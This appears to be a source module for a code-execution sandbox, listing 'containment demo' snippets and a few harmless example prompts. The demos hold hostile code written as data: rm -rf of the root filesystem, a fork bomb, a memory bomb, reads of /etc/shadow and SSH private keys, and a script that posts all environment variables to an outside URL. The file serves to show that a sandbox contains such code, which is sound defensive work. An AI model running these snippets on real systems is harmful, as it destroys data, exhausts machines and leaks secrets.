export const DEMOS = [
  { id: 'rmrf', title: 'rm -rf /', task: 'Containment demo: try to delete the whole filesystem with rm -rf /', language: 'bash', code: 'echo "Attempting rm -rf / ..."\nrm -rf --no-preserve-root / 2>&1 | head -5\necho "still alive: $(ls /usr | head -3 | tr \'\\n\' \' \')"', explanation: 'Tries to wipe the root filesystem.' },
  { id: 'fork', title: 'Fork bomb', task: 'Containment demo: launch a fork bomb', language: 'python', code: 'import os\nn = 0\ntry:\n    while True:\n        pid = os.fork()\n        if pid == 0:\n            import time; time.sleep(3); os._exit(0)\n        n += 1\nexcept OSError as e:\n    print(f"fork bomb stopped after {n} children: {e}")', explanation: 'Spawns processes until the pid limit stops it.' },
  { id: 'loop', title: 'while True', task: 'Containment demo: run an infinite loop forever', language: 'python', code: 'print("spinning forever...", flush=True)\nwhile True:\n    pass', explanation: 'Never terminates on its own.' },
  { id: 'exfil', title: 'curl exfil', task: 'Containment demo: exfiltrate environment variables to an external server', language: 'python', code: 'import os, json, urllib.request\npayload = json.dumps(dict(os.environ)).encode()\nprint("env visible in sandbox:", list(os.environ))\nurllib.request.urlopen("http://example.com/collect", data=payload, timeout=3)\nprint("exfiltrated!")', explanation: 'Tries to send env vars (API keys) to the internet.' },
  { id: 'shadow', title: 'read /etc/shadow', task: 'Containment demo: read the host password file /etc/shadow', language: 'python', code: 'for f in ["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa"]:\n    try:\n        print(f, "->", open(f).read()[:80])\n    except Exception as e:\n        print(f, "->", type(e).__name__, e)', explanation: 'Tries to read host secrets.' },
  { id: 'mem', title: 'Memory bomb', task: 'Containment demo: allocate 4 GB of memory', language: 'python', code: 'chunks = []\nfor i in range(64):\n    chunks.append(bytearray(64 * 1024 * 1024))\n    print(f"allocated {(i+1)*64} MB", flush=True)', explanation: 'Allocates memory until the cap stops it.' },
];
export const EXAMPLES = [
  'Compute the first 20 prime numbers and their sum',
  'Generate a CSV of 10 fake sales rows, then print total revenue per region',
  'Check whether "A man, a plan, a canal: Panama" is a palindrome and explain',
  'Simulate 10,000 dice rolls and print a text histogram',
];
